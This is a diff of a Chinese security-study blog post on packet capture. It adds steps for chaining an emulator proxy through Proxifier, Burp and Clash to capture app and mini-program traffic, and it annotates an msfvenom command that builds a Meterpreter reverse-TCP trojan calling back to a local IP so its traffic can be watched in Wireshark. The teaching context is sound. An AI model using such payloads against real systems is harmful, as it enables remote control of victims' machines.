@@ -1,10 +1,10 @@
 ---
 title: 抓包技术&全局协议&通讯双层&多项目联动&网卡模式&检验绕过&移动应用
 published: 2026-01-21 10:00:00
-description: 暂时还没好。
-tags: [基础入门,Web应用,PC应用,移动端应用,Https,Http]
+description: 本章主要内容：抓包工具的联动（充分利用抓包工具的插件）。该如何进行科学抓包，以及全局协议抓包：主要解决有部分app、Web、小程序，当设置了代理后无法抓包的问题。
+tags: [基础入门,Web应用,PC应用,移动端应用,Https,Http,TCP,UDP]
 category: 网络安全
-draft: true
+draft: false
 ---
 
 # 知识点
@@ -90,11 +90,27 @@ https://www.colasoft.com.cn/
 
 ## 思考
 
-如果是需要访问小程序或者app该如何操作（不能正常访问到的）？（待实践）
+如果是需要访问小程序或者app该如何操作（不能正常访问到的）？
 
+### 实践
 
+流量走向：模拟器(代理设置)->Proxifier->burp->clash。
 
+首先就是设置模拟器的代理，为主机IP+clash的端口号。
 
+之后就是在burp中设置，我的burp是监听8888端口，上游端口：为clash。
+
+![image-20260121101725122](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121101725122.png)
+
+之后在profixier中进行流量转发：
+
+![image-20260121101834616](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121101834616.png)
+
+![image-20260121101907670](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121101907670.png)
+
+![image-20260121101953321](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121101953321.png)
+
+![image-20260121102021538](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121102021538.png)
 
 ## 全局协议抓包
 
@@ -106,9 +122,9 @@ WireShark 科来网络系统
 
    校验：检测到了当前机器的代理设置，做了一个策略防止。
 
-   做了代理的设置数据走向：本身应用-代理-还没有到网卡-给到监听抓包工具。
+   做了代理的设置数据走向：本身应用->代理->还没有到网卡->给到监听抓包工具。
 
-   没有做代理的数据走向：本身应用-服务器（网卡抓包） 代理是在网卡之前产生。
+   没有做代理的数据走向：本身应用->服务器（网卡抓包） 代理是在网卡之前产生。
 
 2. APP/小程序/PC应用
 
@@ -118,6 +134,8 @@ WireShark 科来网络系统
 
 ```cmd
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.9 lport=6666 -f exe -o 9.exe
+// 生成tcp协议的木马，绑定的6666端口
+// 可以使用wireshark以及科来查看到数据的传输
 ```
 
 ### 演示案例2-抓包技术-全局协议-WireShark&科来
